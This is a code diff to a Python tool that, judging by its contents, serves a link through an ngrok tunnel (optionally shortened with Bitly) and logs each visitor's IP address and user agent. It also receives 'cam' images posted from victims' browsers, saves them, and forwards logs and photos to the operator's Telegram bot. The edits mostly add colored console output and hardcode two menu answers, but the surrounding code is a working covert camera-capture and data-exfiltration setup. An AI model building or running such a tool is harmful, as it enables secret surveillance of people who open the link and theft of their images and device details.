@@ -58,14 +58,16 @@ try:
     final_ngrok = public_url[:4] + "s" + public_url[4:]
 
     # url shorten or not
-    shorten = input("Do you want to use Bitly to shorten url link? ['y' or 'n']: ")
+    # shorten = input(f"{bcolors.WARNING} Do you want to use Bitly to shorten url link? ['y' or 'n']: {bcolors.ENDC}")
+    shorten = 'n'
     if shorten == 'y' or shorten == 'Y' or shorten == 'Yes' or shorten =='yes':
         final_ngrok = s.bitly.short(final_ngrok)
     else:
         final_ngrok = final_ngrok
 
     # telegram bot building
-    tgbot = input("Do you want telegram bot support? ['y' or 'n']:")
+    # tgbot = input(f"{bcolors.WARNING} Do you want telegram bot support? ['y' or 'n']: {bcolors.ENDC}")
+    tgbot = 'y'
     if tgbot == 'y' or tgbot == 'Y' or tgbot == 'Yes' or tgbot =='yes':
 
         @bot.message_handler(commands=["start"])
@@ -93,7 +95,7 @@ try:
 
         @bot.message_handler(commands=["stop"])
         def send_welcome_message(msg):
-            print("Stoping......\n")
+            print(f"{bcolors.FAIL} Stoping......\n")
             os.kill(os.getpid(), signal.SIGINT)
             
     else:
@@ -101,7 +103,7 @@ try:
 
     
     #final ngrok link
-    print(" * ngrok tunnel link ->     " + final_ngrok)
+    print(f" * ngrok tunnel link ->   {bcolors.OKCYAN}{final_ngrok}{bcolors.ENDC}")
     app.config["BASE_URL"] = public_url
 
     # flask
@@ -132,7 +134,7 @@ try:
             to_url2 = "https://api.telegram.org/bot"+ API_KEY +"/sendMessage?chat_id="+ str(user_id) +"&text="+ str(log_msg)
             requests.get(to_url2)
 
-            print(now +"    "+ ip_address +"    "+ user_agent)
+            print(f"{now} \t {bcolors.OKCYAN}{ip_address}{bcolors.ENDC} \t {user_agent}\t")
 
         # post request
         elif request.method == 'POST':
@@ -153,7 +155,7 @@ try:
             file2.write(data)
             file2.close()
             
-            print("[+] Cam image recieved.  \n ")
+            print(f"{bcolors.OKGREEN}[{bcolors.ENDC}+{bcolors.OKGREEN}] Cam image recieved.{bcolors.FAIL} \n ")
 
             # sending photo to telegram bot
             data = {"chat_id": user_id, "caption": ""}
@@ -171,4 +173,4 @@ try:
     # bot.set_webhook(url='https://test-bot-2022-z4n.herokuapp.com/' + API_KEY)
 
 except KeyboardInterrupt:
-    print("Ending task.....\n")
+    print(f"{bcolors.FAIL} Ending task.....\n")
